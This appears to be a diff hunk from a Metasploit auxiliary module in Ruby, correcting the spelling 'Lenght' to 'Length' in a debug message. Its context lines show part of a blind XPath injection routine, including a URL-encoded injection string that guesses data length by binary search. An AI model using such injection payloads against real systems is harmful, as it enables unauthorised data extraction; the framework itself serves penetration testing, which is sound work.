@@ -145,7 +145,7 @@ class Metasploit3 < Msf::Auxiliary
 				middle = (low + high) / 2;
 
 				if datastore['DEBUG_INJ']
-					print_status("Lenght Low: #{low} High: #{high} Med: #{middle}")
+					print_status("Length Low: #{low} High: #{high} Med: #{middle}")
 				end
 
 				injlen = "'%20and%20string-length(#{xcomm})=#{middle}%20and%20'#{rnum}'='#{rnum}"
